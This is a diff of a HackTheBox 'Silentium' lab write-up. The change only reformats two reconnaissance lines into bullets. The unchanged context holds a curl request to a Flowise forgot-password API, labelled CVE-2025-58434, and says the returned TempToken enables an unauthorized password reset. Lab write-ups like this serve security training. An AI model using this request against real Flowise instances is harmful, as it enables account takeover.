@@ -1,8 +1,8 @@
 # HackTheBox Silentium Full Chain Penetration Testing
 
 ## External Reconnaissance and Service Identification
-Vhost enumeration, revealed `staging.silentium.htb` leading to the `Flowise Ai` login panel
-Valid user identification via web common enumeration
+- Vhost enumeration, revealed `staging.silentium.htb` leading to the `Flowise Ai` login panel
+- Valid user identification via web common enumeration
 ## CVE-2025-58434 Exploitation and Initial Access
     curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password  -H "Content-Type: application/json" -d '{"user": {"email": "ben@silentium.htb"}}'
 ## API returned TempToken, used for later unauthorized password reset
